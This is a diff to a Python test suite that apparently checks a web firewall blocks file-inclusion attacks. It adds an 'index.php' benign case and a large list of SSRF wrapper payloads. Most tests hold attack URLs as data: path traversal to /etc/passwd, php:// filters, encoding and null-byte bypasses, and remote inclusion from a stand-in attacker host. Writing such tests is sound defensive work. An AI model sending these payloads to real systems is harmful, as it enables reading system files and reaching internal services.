@@ -14,13 +14,15 @@ class TestFileInclusion(unittest.TestCase):
         urls = ["",
                 "WebGoat",
                 "WebGoat/login?error",
-                "WebGoat/register.mvc"]
+                "WebGoat/register.mvc",
+                "index.php"]
 
         for i in urls:
             with self.subTest(i=i):
                 response = requests.get(self.url + i)
                 self.assertNotEqual(403, response.status_code,
-                                 "False Positive on URL '" + self.url + i + "'" + " with status code " + str(response.status_code))
+                                    "False Positive on URL '" + self.url + i + "'" + " with status code " + str(
+                                        response.status_code))
 
     def test_path_traversal(self):
         urls = ["index.php?page=../../../etc/passwd",
@@ -31,7 +33,8 @@ class TestFileInclusion(unittest.TestCase):
             with self.subTest(i=i):
                 response = requests.get(self.url + i)
                 self.assertEqual(403, response.status_code,
-                                 "False Negative on URL '" + self.url + i + "'" + " with status code " + str(response.status_code))
+                                 "False Negative on URL '" + self.url + i + "'" + " with status code " + str(
+                                     response.status_code))
 
     def test_php_wrapper(self):
         urls = ["index.php?page=php://filter/read=string.rot13/resource=index.php",
@@ -46,7 +49,8 @@ class TestFileInclusion(unittest.TestCase):
             with self.subTest(i=i):
                 response = requests.get(self.url + i)
                 self.assertEqual(403, response.status_code,
-                                 "False Negative on URL '" + self.url + i + "'" + " with status code " + str(response.status_code))
+                                 "False Negative on URL '" + self.url + i + "'" + " with status code " + str(
+                                     response.status_code))
 
     def test_encoding(self):
         urls = ["index.php?page=..%252f..%252f..%252fetc%252fpasswd",
@@ -58,7 +62,8 @@ class TestFileInclusion(unittest.TestCase):
             with self.subTest(i=i):
                 response = requests.get(self.url + i)
                 self.assertEqual(403, response.status_code,
-                                 "False Negative on URL '" + self.url + i + "'" + " with status code " + str(response.status_code))
+                                 "False Negative on URL '" + self.url + i + "'" + " with status code " + str(
+                                     response.status_code))
 
     def test_null_byte_injection(self):
         urls = ["index.php?page=../../../etc/passwd%00"]
@@ -67,7 +72,8 @@ class TestFileInclusion(unittest.TestCase):
             with self.subTest(i=i):
                 response = requests.get(self.url + i)
                 self.assertEqual(403, response.status_code,
-                                 "False Negative on URL '" + self.url + i + "'" + " with status code " + str(response.status_code))
+                                 "False Negative on URL '" + self.url + i + "'" + " with status code " + str(
+                                     response.status_code))
 
     def test_access_folder(self):
         urls = ["index.php?page=utils/scripts/../../../../../etc/passwd"]
@@ -76,7 +82,8 @@ class TestFileInclusion(unittest.TestCase):
             with self.subTest(i=i):
                 response = requests.get(self.url + i)
                 self.assertEqual(403, response.status_code,
-                                 "False Negative on URL '" + self.url + i + "'" + " with status code " + str(response.status_code))
+                                 "False Negative on URL '" + self.url + i + "'" + " with status code " + str(
+                                     response.status_code))
 
     def test_path_truncation(self):
         urls = ["index.php?page=a/../../../../../../../../../etc/passwd..\.\.\.\.\.\.\.\.\.\.\.\.",
@@ -88,7 +95,8 @@ class TestFileInclusion(unittest.TestCase):
             with self.subTest(i=i):
                 response = requests.get(self.url + i)
                 self.assertEqual(403, response.status_code,
-                                 "False Negative on URL '" + self.url + i + "'" + " with status code " + str(response.status_code))
+                                 "False Negative on URL '" + self.url + i + "'" + " with status code " + str(
+                                     response.status_code))
 
     def test_rfi(self):
         urls = ["index.php?page=http://atacker.com/evil.php",
@@ -98,7 +106,8 @@ class TestFileInclusion(unittest.TestCase):
             with self.subTest(i=i):
                 response = requests.get(self.url + i)
                 self.assertEqual(403, response.status_code,
-                                 "False Negative on URL '" + self.url + i + "'" + " with status code " + str(response.status_code))
+                                 "False Negative on URL '" + self.url + i + "'" + " with status code " + str(
+                                     response.status_code))
 
     def test_filter_bypass(self):
         urls = ["index.php?page=....//....//etc/passwd",
@@ -114,7 +123,45 @@ class TestFileInclusion(unittest.TestCase):
             with self.subTest(i=i):
                 response = requests.get(self.url + i)
                 self.assertEqual(403, response.status_code,
-                                 "False Negative on URL '" + self.url + i + "'" + " with status code " + str(response.status_code))
+                                 "False Negative on URL '" + self.url + i + "'" + " with status code " + str(
+                                     response.status_code))
+
+    def test_ssrf_wrappers(self):
+        urls = ["foo/bar?vuln-function=http://127.0.0.1:8888/secret",
+                "index?page=dict://",
+                "index?page=expect://",
+                "index?page=fd://",
+                "index?page=file://",
+                "index?page=file:///",
+                "index?page=ftp://",
+                "index?page=gopher://",
+                "index?page=http://",
+                "index?page=https://",
+                "index?page=imap://",
+                "index?page=jar:ftp://local-domain.com!/",
+                "index?page=jar:http://0.0.0.0!/",
+                "index?page=jar:http://127.0.0.1!/",
+                "index?page=jar:http://localhost!/",
+                "index?page=jar:proto-schema://blah!/",
+                "index?page=ldap://",
+                "index?page=mailto://",
+                "index?page=netdoc:///etc/hosts",
+                "index?page=netdoc:///etc/passwd",
+                "index?page=ogg://",
+                "index?page=pop3://",
+                "index?page=sftp://",
+                "index?page=smtp://",
+                "index?page=ssh2://",
+                "index?page=ssh://",
+                "index?page=telnet://",
+                "index?page=tftp://"]
+
+        for i in urls:
+            with self.subTest(i=i):
+                response = requests.get(self.url + i)
+                self.assertEqual(403, response.status_code,
+                                 "False Negative on URL '" + self.url + i + "'" + " with status code " + str(
+                                     response.status_code))
 
 
 if __name__ == '__main__':
